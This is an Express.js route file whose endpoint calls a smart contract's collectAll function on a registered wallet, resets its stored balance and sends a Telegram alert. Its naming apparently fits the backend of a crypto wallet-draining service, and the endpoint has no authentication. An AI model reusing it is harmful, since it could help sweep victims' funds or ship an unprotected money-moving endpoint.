import express from "express";
import { pool } from "../db.js";
import { collectAll } from "../contract.js";
import { sendPullSuccess, sendError } from "../telegramService.js";

const router = express.Router();

// POST /pull/execute { wallet }
router.post("/execute", async (req, res) => {
  try {
    const { wallet } = req.body;
    if (!wallet) return res.status(400).json({ error: "wallet required" });

    // confirm wallet exists
    const r = await pool.query("SELECT address FROM wallets WHERE address=$1", [wallet.toLowerCase()]);
    if (r.rowCount === 0) return res.status(404).json({ error: "wallet not registered" });

    // call contract collectAll
    const txResp = await collectAll(wallet);
    const receipt = await txResp.wait();
    // log
    await pool.query("INSERT INTO pull_logs(wallet, amount, tx_hash) VALUES($1,$2,$3)", [
      wallet,
      0,
      receipt.transactionHash,
    ]);
    // reset last_balance & alert_pending
    await pool.query("UPDATE wallets SET last_balance = 0, alert_pending = false WHERE address = $1", [
      wallet.toLowerCase(),
    ]);

    await sendPullSuccess(wallet, "unknown", receipt.transactionHash);
    return res.json({ ok: true, tx: receipt.transactionHash });
  } catch (err) {
    console.error(err);
    await sendError(err.message);
    return res.status(500).json({ error: err.message });
  }
});

export default router;
